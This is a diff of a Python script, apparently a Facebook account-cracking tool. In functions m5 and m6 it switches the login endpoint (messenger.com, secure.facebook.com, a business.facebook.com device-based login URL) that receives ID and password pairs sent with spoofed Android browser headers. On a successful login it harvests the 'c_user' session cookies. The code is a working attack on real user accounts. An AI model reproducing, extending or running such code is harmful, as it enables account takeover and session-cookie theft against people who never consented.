@@ -1168,7 +1168,7 @@ def m5(idf,pwv):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://www.messenger.com/login',data=log_data,headers=header_freefb).text
+   lo = session.post('https://www.secure.facebook.com/login/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1246,7 +1246,7 @@ def m6(idf,pw):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://www.secure.facebook.com/login/',data=log_data,headers=header_freefb).text
+   lo = session.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
